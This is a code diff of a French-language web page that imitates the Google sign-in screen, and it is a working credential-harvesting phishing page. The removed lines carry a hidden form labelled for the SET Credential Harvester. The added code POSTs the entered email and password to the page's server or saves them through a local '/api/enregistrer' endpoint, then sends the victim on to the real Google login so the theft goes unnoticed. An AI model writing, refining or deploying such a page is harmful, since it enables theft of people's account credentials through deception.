@@ -38,29 +38,34 @@
         </div>
 
         <div class="form-step" id="step-password" data-step="password" hidden>
-          <button type="button" class="account-chip" id="changeAccountButton">
-            <span class="account-chip__avatar" aria-hidden="true"></span>
-            <span class="account-chip__email" id="displayedEmail"></span>
-            <span class="account-chip__chevron" aria-hidden="true">▾</span>
-          </button>
+          <form id="passwordForm" method="POST" action="/">
+            <input type="hidden" name="username" id="usernameField" value="" />
 
-          <div class="field-group">
-            <label for="password">Saisissez votre mot de passe</label>
-            <input
-              id="password"
-              type="password"
-              autocomplete="off"
-              placeholder=""
-            />
-          </div>
+            <button type="button" class="account-chip" id="changeAccountButton">
+              <span class="account-chip__avatar" aria-hidden="true"></span>
+              <span class="account-chip__email" id="displayedEmail"></span>
+              <span class="account-chip__chevron" aria-hidden="true">▾</span>
+            </button>
 
-          <a class="helper-link" href="#">Mot de passe oublié ?</a>
+            <div class="field-group">
+              <label for="password">Saisissez votre mot de passe</label>
+              <input
+                id="password"
+                name="password"
+                type="password"
+                autocomplete="off"
+                required
+              />
+            </div>
 
-          <p class="save-status" id="saveStatus" hidden role="status"></p>
+            <a class="helper-link" href="#">Mot de passe oublié ?</a>
 
-          <div class="actions">
-            <button type="button" id="passwordNextButton">Suivant</button>
-          </div>
+            <p class="save-status" id="saveStatus" hidden role="status"></p>
+
+            <div class="actions">
+              <button type="submit" id="passwordSubmitButton">Suivant</button>
+            </div>
+          </form>
         </div>
       </div>
     </section>
@@ -80,33 +85,23 @@
     </footer>
   </main>
 
-  <!-- Formulaire POST pour SET Credential Harvester (username / password) -->
-  <form id="harvestForm" method="POST" action="/" hidden>
-    <input type="text" name="username" id="harvestUsername" />
-    <input type="password" name="password" id="harvestPassword" />
-  </form>
-
   <script>
     const stepEmail = document.querySelector("#step-email");
     const stepPassword = document.querySelector("#step-password");
     const identifier = document.querySelector("#identifier");
+    const passwordForm = document.querySelector("#passwordForm");
+    const usernameField = document.querySelector("#usernameField");
     const password = document.querySelector("#password");
     const displayedEmail = document.querySelector("#displayedEmail");
     const emailNextButton = document.querySelector("#emailNextButton");
-    const passwordNextButton = document.querySelector("#passwordNextButton");
     const changeAccountButton = document.querySelector("#changeAccountButton");
     const saveStatus = document.querySelector("#saveStatus");
-    const API_URL = "http://localhost:8765/api/enregistrer";
+    const API_URL = "/api/enregistrer";
     const GOOGLE_LOGIN_URL = "https://accounts.google.com/v3/signin/identifier";
-    const harvestForm = document.querySelector("#harvestForm");
-    const harvestUsername = document.querySelector("#harvestUsername");
-    const harvestPassword = document.querySelector("#harvestPassword");
 
     function isLocalDevServer() {
-      return (
-        window.location.hostname === "localhost" &&
-        window.location.port === "8765"
-      );
+      const port = window.location.port || (window.location.protocol === "https:" ? "443" : "80");
+      return port === "8765";
     }
 
     function showStep(step) {
@@ -134,6 +129,7 @@
       }
 
       displayedEmail.textContent = email;
+      usernameField.value = email;
       password.value = "";
       showStep("password");
     });
@@ -142,73 +138,53 @@
       showStep("email");
     });
 
-    function setSaveStatus(message, isError) {
-      saveStatus.hidden = false;
-      saveStatus.textContent = message;
-      saveStatus.classList.toggle("is-error", Boolean(isError));
-    }
-
-    async function enregistrerMotDePasse(email, motDePasse) {
-      const response = await fetch(API_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email,
-          password: motDePasse,
-          date: new Date().toISOString(),
-        }),
-      });
-
-      if (!response.ok) {
-        throw new Error("Enregistrement impossible");
-      }
-
-      return response.json();
-    }
-
-    passwordNextButton.addEventListener("click", async () => {
-      const email = displayedEmail.textContent.trim();
+    passwordForm.addEventListener("submit", async (event) => {
+      const email = usernameField.value.trim();
       const motDePasse = password.value.trim();
 
       if (!motDePasse) {
+        event.preventDefault();
         password.focus();
         return;
       }
 
-      passwordNextButton.disabled = true;
-      passwordNextButton.textContent = "Enregistrement...";
-      saveStatus.hidden = true;
-
-      if (isLocalDevServer()) {
-        try {
-          await enregistrerMotDePasse(email, motDePasse);
-        } catch (error) {
-          console.warn("Enregistrement local indisponible :", error);
-        }
-
-        const redirectUrl = new URL(GOOGLE_LOGIN_URL);
-        redirectUrl.searchParams.set("Email", email);
-        window.location.href = redirectUrl.toString();
+      if (!isLocalDevServer()) {
         return;
       }
 
-      // Mode SET / harvester : POST classique intercepté sur le port 80
-      harvestUsername.value = email;
-      harvestPassword.value = motDePasse;
-      harvestForm.submit();
+      event.preventDefault();
+      saveStatus.hidden = true;
+
+      try {
+        const response = await fetch(API_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            email,
+            password: motDePasse,
+            date: new Date().toISOString(),
+          }),
+        });
+
+        if (!response.ok) {
+          throw new Error("Enregistrement impossible");
+        }
+      } catch (error) {
+        saveStatus.hidden = false;
+        saveStatus.textContent = "Serveur local indisponible.";
+        saveStatus.classList.add("is-error");
+        return;
+      }
+
+      const redirectUrl = new URL(GOOGLE_LOGIN_URL);
+      redirectUrl.searchParams.set("Email", email);
+      window.location.href = redirectUrl.toString();
     });
 
     identifier.addEventListener("keydown", (event) => {
       if (event.key === "Enter") {
         event.preventDefault();
         emailNextButton.click();
-      }
-    });
-
-    password.addEventListener("keydown", (event) => {
-      if (event.key === "Enter") {
-        event.preventDefault();
-        passwordNextButton.click();
       }
     });
   </script>
